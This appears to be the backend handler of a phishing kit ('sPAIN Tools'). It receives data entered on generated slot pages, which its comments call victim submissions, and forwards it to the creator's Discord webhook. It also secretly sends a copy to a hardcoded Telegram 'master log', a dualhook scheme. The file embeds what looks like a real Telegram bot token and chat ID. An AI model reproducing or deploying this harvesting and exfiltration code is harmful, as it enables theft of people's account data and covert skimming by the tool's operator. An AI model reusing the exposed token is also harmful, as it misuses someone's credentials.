// api/submit.js
// Receives answers from the generated 1-9 slot page.
// Forwards to:
//   - webhook2  (the one the victim typed on the generated page)
//   - webhook1  (the creator's webhook — always)
//   - Telegram  (your master log — always)
// For plain Slots 1-9, webhook1 is the only creator webhook (no webhook2).

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// ── Redis ────────────────────────────────────────────────────────────────────

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

// ── Telegram ─────────────────────────────────────────────────────────────────

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) { /* non-fatal */ }
}

// ── Discord webhook ───────────────────────────────────────────────────────────

async function sendToDiscord(webhookUrl, embed) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'sPAIN Tools',
        avatar_url: 'https://spain-tools.vercel.app/favicon.ico',
        embeds: [embed]
      })
    });
  } catch (_) { /* non-fatal */ }
}

// ── Handler ───────────────────────────────────────────────────────────────────

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const {
    slug,      // which page was this submitted from
    slots,     // object: { slot1: "val", slot2: "val", ... slot9: "val" }
    webhook2   // optional: the webhook the victim typed on the page (dualhook only)
  } = body || {};

  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  // ── Load page config from Redis ───────────────────────────────────────────
  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }

  if (!record) {
    return res.status(404).json({ error: 'Page not found' });
  }

  // ── Build embed fields ────────────────────────────────────────────────────
  const fields = Object.entries(slots).map(([key, value]) => ({
    name: `Slot ${key.replace('slot', '')}`,
    value: value || '*(empty)*',
    inline: true
  }));

  const now = new Date().toISOString();

  const embed = {
    title: `📥 New Submission — ${record.displayName}`,
    color: 0xc026d3,
    fields,
    footer: { text: `sPAIN Tools • ${slug} • ${now}` },
    timestamp: now
  };

  // ── Dispatch ──────────────────────────────────────────────────────────────

  // 1. webhook1 (creator's webhook — always receives)
  await sendToDiscord(record.webhook, embed);

  // 2. webhook2 (victim's webhook — only present on dualhook pages)
  if (webhook2 && webhook2 !== record.webhook) {
    await sendToDiscord(webhook2, embed);
  }

  // 3. Telegram master log — always
  const slotLines = Object.entries(slots)
    .map(([k, v]) => `  Slot ${k.replace('slot','')}: ${v || '(empty)'}`)
    .join('\n');

  const tgMsg = [
    `📥 <b>New Submission!</b>`,
    `📁 Page: <code>${slug}</code> (${record.displayName})`,
    `🔧 Type: ${record.type}`,
    ``,
    `<b>Slots:</b>`,
    slotLines,
    ``,
    webhook2 ? `📡 Webhook2 (victim): <code>${webhook2}</code>` : '',
    `📡 Webhook1 (creator): <code>${record.webhook}</code>`,
    `🕐 ${now}`
  ].filter(s => s !== undefined).join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ success: true });
}
